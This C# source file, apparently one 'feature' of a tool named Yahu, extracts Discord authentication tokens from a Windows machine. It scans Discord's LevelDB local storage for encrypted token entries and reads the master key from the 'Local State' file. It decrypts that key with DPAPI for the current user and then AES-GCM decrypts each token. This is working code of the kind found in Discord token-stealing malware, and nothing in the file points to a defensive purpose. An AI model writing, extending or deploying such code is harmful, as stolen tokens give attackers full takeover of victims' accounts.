using System.Text;
using System.Text.RegularExpressions;
using System.IO;
using System.Text.Json;

namespace Yahu.features;

using System.Security.Cryptography;
using System.IO;

public static class Discord
{

    public static List<string> GetTokens(string path)
    {
        var actualPath = Path.Combine(path, "Local Storage", "leveldb");
        var tokens = new List<string>();

        if (!Directory.Exists(actualPath))
        {
            return tokens;
        }
        
        var files = Directory.GetFiles(actualPath, "*.*", SearchOption.TopDirectoryOnly);
        foreach (var file in files)
        {
            if (!Path.GetFileName(file).EndsWith(".ldb") && !Path.GetFileName(file).EndsWith(".log"))
            {
                continue;
            }

            try
            {
                using (var fs = new FileStream(file, FileMode.Open,  FileAccess.Read, FileShare.ReadWrite))
                {
                    using (var reader = new StreamReader(fs))
                    {
                        var content = reader.ReadToEnd(); 
                        if (string.IsNullOrEmpty(content))
                        {
                            continue;
                        }

                        var matches = Regex.Matches(content, @"dQw4w9WgXcQ:([A-Za-z0-9+/=]+)");
                        foreach (Match match in matches)
                        {
                            tokens.Add(match.Value);
                        }

                    }
                    
                }
                    
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                continue;
            }
        }
        return tokens;
    }
    
    public static byte[] DecryptMasterkey(byte[] key)
    {
        var decryptedKeyBytes = ProtectedData.Unprotect(key, null, DataProtectionScope.CurrentUser);
        return decryptedKeyBytes;
    }

    public static string GetKey(string path)
    {

        try
        {
           return JsonDocument.Parse(File.ReadAllText(path)).RootElement.GetProperty("os_crypt").GetProperty("encrypted_key").GetString();
           
        }
        catch (Exception e)
        {
            Console.WriteLine(e);
            return null;
        }
        
    }

    public static HashSet<string> GetDiscordTokens(Dictionary<string, string> paths)
    {
        var checkedTokens = new HashSet<string>();
        foreach (var path in paths.Values)
        {
            if (!Path.Exists(path))
                continue;
            
            var localStatePath = Path.Join(path, "Local State");
            if (!File.Exists(localStatePath))
                continue;
            
            try
            {
                var rawKey = Convert.FromBase64String(GetKey(localStatePath)).Skip(5).ToArray();
                var key = DecryptMasterkey(rawKey);
                var tokens = GetTokens(path);
                foreach (var rawToken in tokens)
                {
                    var token = rawToken.EndsWith("\\") ? rawToken.TrimEnd('\\') : rawToken;
                    var splittedToken = token.Split(new[] {"dQw4w9WgXcQ:"}, StringSplitOptions.None)[1];
                    var b64Token = Convert.FromBase64String(splittedToken);
                    var iv = b64Token.Skip(3).Take(12).ToArray();
                    var encryptedToken = b64Token.Skip(15).ToArray();
                    using (var aes = new AesGcm(key, 16))
                    {
                        int tagSize = 16;
                        int cipherSize = encryptedToken.Length - tagSize;
                        var tag = encryptedToken.Skip(cipherSize).Take(tagSize).ToArray();
                        var cipher = encryptedToken.Take(cipherSize).ToArray();
                        
                        var decryptedToken = new byte[cipher.Length];
                        aes.Decrypt(iv, cipher, tag, decryptedToken);
                        checkedTokens.Add(Encoding.UTF8.GetString(decryptedToken));
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("Failed to get master key: " + e.Message);
                continue;
            }
            
            
        }
        return checkedTokens;
    }

    
}